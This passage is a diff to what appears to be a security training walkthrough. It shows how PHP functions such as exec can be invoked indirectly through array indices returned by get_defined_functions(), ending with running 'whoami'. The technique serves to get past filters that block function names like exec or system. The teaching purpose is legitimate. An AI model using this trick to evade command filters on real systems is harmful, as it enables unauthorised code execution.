@@ -238,3 +238,37 @@ Array
 )
 ```
 
+As expected, the function returned an array containing all the defined functions.
+
+Let's verify we can invoke a function based on its array index value. We'll try `strlen()`, which is at index `4` of the `"internal"` array based on the output above.
+```bash
+php > echo get_defined_functions()["internal"][4]("hello world");
+11
+```
+Excellent. We invoked the `strlen()` function by accessing its array index in the array returned from `get_defined_functions()`. After reviewing the full list of values returned by `get_defined_functions()`, we'll find the functions we're most interested in start at index `550`.
+```bash
+php > print_r(get_defined_functions());
+Array
+(
+    [internal] => Array
+        (
+...
+            [550] => exec
+            [551] => system
+            [552] => passthru
+            [553] => escapeshellcmd
+            [554] => escapeshellarg
+            [555] => shell_exec
+...
+```
+```bash
+php > echo get_defined_functions()["internal"][550];
+exec
+php >
+```
+
+Let's verify we can invoke `exec()` this way and run `whoami`.
+```bash
+php > echo get_defined_functions()["internal"][550]("whoami");
+student
+```
